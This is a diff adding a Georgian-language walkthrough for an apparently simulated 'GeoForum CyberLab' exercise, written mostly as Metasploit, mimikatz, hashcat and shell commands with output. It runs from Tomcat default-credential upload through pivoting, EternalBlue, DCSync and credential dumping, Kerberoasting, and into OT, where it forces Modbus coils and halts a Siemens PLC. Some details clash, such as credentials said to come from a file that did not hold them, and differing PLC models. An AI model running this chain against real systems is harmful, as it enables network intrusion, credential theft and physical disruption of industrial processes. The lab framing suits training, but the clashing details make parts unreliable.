@@ -1,0 +1,195 @@
+══════════════════════════════════════════════════════════════════
+  GeoForum CyberLab — HARD MODE  |  სრული Walkthrough
+  DMZ → CORP → OT/SCADA  |  17 პრობლემა გასწორებულია
+══════════════════════════════════════════════════════════════════
+
+🌐 ნაბიჯი 1: DMZ — Recon & Initial Access
+─────────────────────────────────────────
+
+[KALI] shodan geoforum.ge
+       → IP: 82.148.10.55  |  Tomcat/9.0.37 on :8080  |  CVE-2020-1938
+
+[KALI] nmap 82.148.10.55 -sS
+       → 80/tcp   Apache/2.4.51
+         443/tcp  Apache/2.4.51
+         8080/tcp Tomcat/9.0.37  ← RCE vector!
+
+[KALI] msfconsole
+[MSF]  search tomcat
+[MSF]  use exploit/multi/http/tomcat_mgr_upload
+
+       ⚠ Tomcat Manager-ს Authentication სჭირდება:
+[MSF]  set HttpUsername tomcat      ← default credentials
+[MSF]  set HttpPassword tomcat
+[MSF]  set RHOSTS 82.148.10.55
+[MSF]  run
+
+       შედეგი: Meterpreter Session 1 (web-server / DMZ)
+
+🌉 ნაბიჯი 2: Pivot მომზადება
+─────────────────────────────────────────
+
+[MET]  sysinfo
+[MET]  ipconfig
+       → eth0: 192.168.10.5  eth1: 10.10.10.x  ← dual-homed!
+
+[MET]  shell
+[SHL]  cat /etc/hosts       → corp-dc 10.10.10.5  AMNESIA domain
+[SHL]  cat /var/www/html/config.php.bak  → DB_PASS: Sup3rS3cr3t!
+[SHL]  exit
+
+[MET]  autoroute -s 10.10.10.0/24
+       → CORP route added via Session 1
+
+[MET]  background
+
+       ⚠ autoroute alone არ კმარა — proxychains სჭირდება nmap-ისთვის:
+[MSF]  use auxiliary/server/socks_proxy
+[MSF]  set SRVPORT 1080
+[MSF]  set VERSION 5
+[MSF]  run
+       → SOCKS5 proxy on 127.0.0.1:1080
+       → /etc/proxychains4.conf: socks5 127.0.0.1 1080
+
+🏢 ნაბიჯი 3: CORP ქსელის დაზვერვა
+─────────────────────────────────────────
+
+       ⚠ proxychains nmap -sT (TCP connect, SYN არ მუშაობს proxy-ს გავლით):
+[KALI] proxychains nmap -sT 10.10.10.5
+       ─ ან MSF DB-ით: ─
+[MSF]  db_nmap -p 389,445,88,3389 10.10.10.5
+       შედეგი: 389/tcp  ldap   AD LDAP 3.0     [ldap_enum]
+               445/tcp  smb    Samba 4.8       [eternalblue]
+               88/tcp   kerberos MIT Kerberos
+               3389/tcp rdp    RDP 8.1         [weak_creds]
+       OS: Windows Server 2012 R2  (2019-ზე EternalBlue არ მუშაობს!)
+
+🔑 ნაბიჯი 4: LDAP Enumeration (credentials required!)
+─────────────────────────────────────────
+
+       ⚠ ldap_hashdump anonymous bind-ით ვერ მუშაობს — creds სჭირდება:
+[MSF]  use auxiliary/gather/ldap_hashdump
+[MSF]  set RHOSTS 10.10.10.5
+[MSF]  set USERNAME j.smith         ← DMZ-ში config.php.bak-ით ვიცით
+[MSF]  set PASSWORD P@ssw0rd2026!
+[MSF]  run
+       შედეგი: Domain users, groups, SPNs სია
+
+🔓 ნაბიჯი 5: EternalBlue → CORP DC (Server 2012 R2)
+─────────────────────────────────────────
+
+       (Server 2012 R2 — MS17-010 patch-ი შეიძლება არ ჰქონდეს)
+[MSF]  use exploit/windows/smb/ms17_010_eternalblue
+[MSF]  set RHOSTS 10.10.10.5
+[MSF]  run
+       → Windows Defender detected — EDR check!
+         25% შანსი AV kill-ისა → თუ ჩაიჭრა:
+         set PAYLOAD windows/x64/meterpreter/reverse_https
+       → Session 2 (corp-dc / CORP)
+
+[MET]  getsystem
+       → 40% შანსია EDR-მა Named Pipe-ი დაბლოკოს:
+         თუ ჩაიჭრა → PrintSpoofer: upload PrintSpoofer64.exe → shell → .\PrintSpoofer64.exe -i -c cmd
+       → NT AUTHORITY\SYSTEM
+
+💀 ნაბიჯი 6: DCSync — Domain Admin ჰეშები
+─────────────────────────────────────────
+
+       ⚠ DC-ზე hashdump SAM-ს ადამს (local accounts only) — domain hashes-ისთვის DCSync:
+
+[MET]  sessions -i 2
+
+       ─── PATH-1: mimikatz DCSync ───
+       ⚠ DCSync გენერირებს Windows Event 4662 — Blue Team WILL see it! (+25% alert)
+[MET]  mimikatz lsadump::dcsync /domain:AMNESIA.LOCAL /user:Administrator
+       → Hash: 8846f7eaee8fb117ad06bdd830b7586c
+
+[MET]  mimikatz lsadump::dcsync /domain:AMNESIA.LOCAL /user:svc_backup
+       → Hash: a87f3a337d73085c45f9416be5787d86
+
+       ─── PATH-2: Kerberoasting (ნაკლები ხმაური) ───
+[MET]  kerberoast
+       → spn_hashes.txt (TGS-REP tickets for svc_backup, svc_scada)
+[MET]  background
+
+       ⚠ TGS-REP ≠ NTLM — სხვა hashcat mode სჭირდება:
+[KALI] hashcat -m 13100 spn_hashes.txt rockyou.txt   ← TGS-REP mode!
+       (hashcat -m 1000 NTLM-ისთვისაა, 13100 Kerberoast-ისთვის)
+       შედეგი: svc_backup:Backup@123  |  svc_scada:Sc4da@Admin!
+
+       ─── NTLM cracking (hashdump-იდან) ───
+[MSF]  sessions -i 2
+[MET]  hashdump         ← local SAM only (DC-ზე domain hashes სხვაგანაა)
+[MET]  mimikatz sekurlsa::logonpasswords   ← LSASS memory (+20% alert)
+[MET]  background
+[KALI] hashcat -m 1000 ntlm.txt rockyou.txt   ← NTLM mode
+       შედეგი: Administrator:Admin@2026!
+
+       ─── bcrypt (web config-ებიდან) ───
+[KALI] hashcat -m 3200 bcrypt.txt rockyou.txt   ← bcrypt mode (ნელი!)
+
+⚙️ ნაბიჯი 7: OT/SCADA Pivot
+─────────────────────────────────────────
+
+       corp-dc (10.10.10.5) routes_to: 172.16.5.0/24
+[MSF]  sessions -i 2
+[MET]  run autoroute -s 172.16.5.0/24
+       → OT subnet ხელმისაწვდომია!
+[MET]  background
+
+[MSF]  db_nmap -p 80,102,502 172.16.5.10
+       შედეგი: 80/tcp  http    WinCC Web 7.5   [default_creds]
+               102/tcp s7comm  Siemens S7-300  [s7_exploit]
+               502/tcp modbus  Modbus TCP      [no_auth]
+       OS: Windows 7 Embedded (EOL — no EDR, no patches since 2020)
+
+[MSF]  use exploit/windows/scada/step7_exec
+[MSF]  set RHOSTS 172.16.5.10
+[MSF]  run
+       → Session 3 (scada-hmi / OT)
+
+[MET]  getsystem
+       → Win7 Embedded — no Credential Guard, NT AUTHORITY\SYSTEM
+
+[MET]  shell
+
+🔧 ნაბიჯი 8: ICS Interaction (Modbus / S7comm)
+─────────────────────────────────────────
+
+[SHL]  cd C:\WinCC\Config
+[SHL]  type SCADA_Config.xml        → Auth=false, PLC 172.16.5.20
+
+       ─── Modbus (no authentication at all) ───
+[SHL]  modbus read_coils 172.16.5.20 0 10
+       → Physical coil states (ρe: valve ON/OFF, pump states)
+
+[SHL]  modbus read_registers 172.16.5.20
+       → Holding register values (process variables)
+
+[SHL]  modbus write_coil 172.16.5.20 3 1
+       ⚠ → Physical output forced ON — real impact on process!
+
+       ─── S7comm (Siemens) ───
+[SHL]  s7client 172.16.5.20 --get-info
+       → S7-400 firmware, serial, CPU state
+
+[SHL]  s7client 172.16.5.20 --stop-cpu
+       ⚠ → PLC HALTED — industrial process STOPPED!
+
+[SHL]  type emergency_codes.txt     → TURB-9912-HALT, COOL-7743-BYPASS
+
+🏁 ნაბიჯი 9: Flag (Victory)
+─────────────────────────────────────────
+
+[SHL]  cd C:\Users\Administrator\Desktop
+[SHL]  type root.txt
+
+       FLAG{SCADA_HMI_COMPROMISED_2026_GeoForumCyberLab}
+
+══════════════════════════════════════════════════════════════════
+  სრული ჯაჭვი: DMZ(Tomcat+creds) → CORP(LDAP+creds / EternalBlue)
+               → OT(S7comm) → PLC(Modbus no_auth)
+  Fixed: #1 Server2012R2  #2 LDAP creds  #3 DCSync  #4 Tomcat creds
+         #5 getsystem EDR  #6 hashdump DC  #7 proxychains  #8 -m 13100
+         #9 Modbus cmds  #10 socks_proxy  #11 AV shell spawn
+══════════════════════════════════════════════════════════════════
